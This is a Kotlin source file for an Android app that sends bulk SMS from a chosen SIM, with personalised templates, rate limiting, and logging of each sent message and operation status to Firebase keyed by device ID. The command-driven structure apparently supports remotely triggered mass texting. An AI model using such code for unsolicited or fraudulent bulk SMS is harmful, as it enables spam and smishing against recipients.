package com.example.fast.util

import android.content.Context
import android.provider.Settings
import com.example.fast.config.AppConfig
import com.google.firebase.Firebase
import com.google.firebase.database.database
import com.prexoft.prexocore.anon.SimSlot
import com.prexoft.prexocore.sendSms

/**
 * Bulk SMS Manager
 * Handles sending messages to multiple recipients with personalization and rate limiting
 */
object BulkSmsManager {
    
    data class Recipient(
        val number: String,
        val name: String? = null
    )
    
    data class BulkOperation(
        val recipients: List<Recipient>,
        val message: String,
        val personalize: Boolean,
        val delaySeconds: Int,
        val sim: SimSlot,
        val bulkOpPath: String,
        val historyTimestamp: Long
    )
    
    /**
     * Parse recipients from string
     * Supports:
     * - Comma-separated numbers: "+123,+456,+789"
     * - Contact list: "contact_list_{id}"
     * - Numbers prefix: "numbers:+123,+456"
     */
    fun parseRecipients(recipientsStr: String, context: Context): List<Recipient> {
        val recipients = mutableListOf<Recipient>()
        
        when {
            recipientsStr.startsWith("contact_list_") -> {
                // Load from contact list
                val listId = recipientsStr.substring("contact_list_".length)
                recipients.addAll(loadContactList(listId, context))
            }
            recipientsStr.startsWith("numbers:") -> {
                // Parse comma-separated numbers
                val numbers = recipientsStr.substring("numbers:".length).split(",")
                recipients.addAll(numbers.map { Recipient(it.trim(), null) })
            }
            else -> {
                // Direct comma-separated numbers
                recipients.addAll(recipientsStr.split(",").map { Recipient(it.trim(), null) })
            }
        }
        
        return recipients.filter { it.number.isNotBlank() }
    }
    
    /**
     * Load contact list from Firebase
     */
    private fun loadContactList(listId: String, context: Context): List<Recipient> {
        val deviceId = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ANDROID_ID
        )
        val contactListPath = "fastpay/$deviceId/contactLists/$listId"
        
        // For now, return empty list - can be enhanced to load from Firebase
        // This would require a contact list storage structure
        LogHelper.d("BulkSmsManager", "Loading contact list $listId from Firebase (not yet implemented)")
        return emptyList()
    }
    
    /**
     * Personalize message with recipient data
     */
    fun personalizeMessage(template: String, recipient: Recipient): String {
        var personalized = template
        personalized = personalized.replace("{name}", recipient.name ?: recipient.number)
        personalized = personalized.replace("{number}", recipient.number)
        personalized = personalized.replace("{random}", (1000..9999).random().toString())
        personalized = personalized.replace("{date}", 
            java.text.SimpleDateFormat("dd-MM-yyyy", java.util.Locale.getDefault())
                .format(java.util.Date()))
        personalized = personalized.replace("{time}", 
            java.text.SimpleDateFormat("HH:mm", java.util.Locale.getDefault())
                .format(java.util.Date()))
        personalized = personalized.replace("{datetime}", 
            java.text.SimpleDateFormat("dd-MM-yyyy HH:mm", java.util.Locale.getDefault())
                .format(java.util.Date()))
        return personalized
    }
    
    /**
     * Send bulk messages asynchronously
     */
    fun sendBulkMessagesAsync(
        context: Context,
        operation: BulkOperation
    ) {
        // Execute in background thread
        Thread {
            var sentCount = 0
            var failedCount = 0
            val deviceId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            )
            
            operation.recipients.forEachIndexed { index, recipient ->
                try {
                    // Validate phone number
                    if (!recipient.number.matches(Regex("^\\+?[1-9]\\d{1,14}$"))) {
                        LogHelper.w("BulkSmsManager", "Invalid phone number: ${recipient.number}, skipping")
                        failedCount++
                        updateBulkOperationStatus(operation.bulkOpPath, sentCount, failedCount)
                        return@forEachIndexed
                    }
                    
                    // Personalize message if needed
                    val personalizedMessage = if (operation.personalize) {
                        personalizeMessage(operation.message, recipient)
                    } else {
                        operation.message
                    }
                    
                    // Validate message length
                    if (personalizedMessage.length > 160) {
                        LogHelper.w("BulkSmsManager", "Message too long for ${recipient.number}, skipping")
                        failedCount++
                        updateBulkOperationStatus(operation.bulkOpPath, sentCount, failedCount)
                        return@forEachIndexed
                    }
                    
                    // Send SMS
                    context.sendSms(
                        recipient.number,
                        personalizedMessage,
                        operation.sim
                    )
                    
                    // Log to Firebase
                    val timestamp = System.currentTimeMillis()
                    val messagePath = AppConfig.getFirebaseMessagePath(deviceId, timestamp)
                    FirebaseWriteHelper.setValue(
                        path = messagePath,
                        data = "sent~${recipient.number}~$personalizedMessage",
                        tag = "BulkSmsManager",
                        onSuccess = {
                            LogHelper.d("BulkSmsManager", "Bulk SMS sent to ${recipient.number}")
                        },
                        onFailure = { e ->
                            LogHelper.e("BulkSmsManager", "Failed to log bulk SMS to Firebase", e)
                        }
                    )
                    
                    sentCount++
                    
                    // Update bulk operation status
                    updateBulkOperationStatus(operation.bulkOpPath, sentCount, failedCount)
                    
                    // Delay between messages (except last one)
                    if (index < operation.recipients.size - 1 && operation.delaySeconds > 0) {
                        Thread.sleep(operation.delaySeconds * 1000L)
                    }
                } catch (e: Exception) {
                    failedCount++
                    LogHelper.e("BulkSmsManager", "Error sending bulk SMS to ${recipient.number}", e)
                    updateBulkOperationStatus(operation.bulkOpPath, sentCount, failedCount)
                }
            }
            
            // Mark bulk operation as completed
            Firebase.database.reference
                .child("${operation.bulkOpPath}/status")
                .setValue("completed")
                .addOnSuccessListener {
                    LogHelper.d("BulkSmsManager", "Bulk operation completed: sent=$sentCount, failed=$failedCount")
                }
                .addOnFailureListener { e ->
                    LogHelper.e("BulkSmsManager", "Failed to update bulk operation status", e)
                }
        }.start()
    }
    
    /**
     * Update bulk operation status in Firebase
     */
    private fun updateBulkOperationStatus(bulkOpPath: String, sent: Int, failed: Int) {
        Firebase.database.reference
            .child(bulkOpPath)
            .updateChildren(mapOf(
                "sent" to sent,
                "failed" to failed,
                "lastUpdated" to System.currentTimeMillis()
            ))
            .addOnFailureListener { e ->
                LogHelper.e("BulkSmsManager", "Failed to update bulk operation status", e)
            }
    }
    
    /**
     * Create bulk operation entry in Firebase
     */
    fun createBulkOperation(
        context: Context,
        recipients: List<Recipient>,
        message: String,
        personalize: Boolean,
        delaySeconds: Int,
        sim: Int,
        historyTimestamp: Long,
        callback: (String?) -> Unit
    ) {
        val deviceId = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ANDROID_ID
        )
        val bulkOpPath = "fastpay/$deviceId/bulkOperations/${System.currentTimeMillis()}"
        val bulkOpData = mapOf(
            "type" to "sendBulkSms",
            "recipients" to recipients.size,
            "message" to message,
            "personalize" to personalize,
            "delay" to delaySeconds,
            "sim" to sim,
            "status" to "processing",
            "sent" to 0,
            "failed" to 0,
            "createdAt" to System.currentTimeMillis(),
            "commandTimestamp" to historyTimestamp
        )
        
        Firebase.database.reference
            .child(bulkOpPath)
            .setValue(bulkOpData)
            .addOnSuccessListener {
                LogHelper.d("BulkSmsManager", "Bulk operation created: $bulkOpPath")
                callback(bulkOpPath)
            }
            .addOnFailureListener { e ->
                LogHelper.e("BulkSmsManager", "Failed to create bulk operation", e)
                callback(null)
            }
    }
}
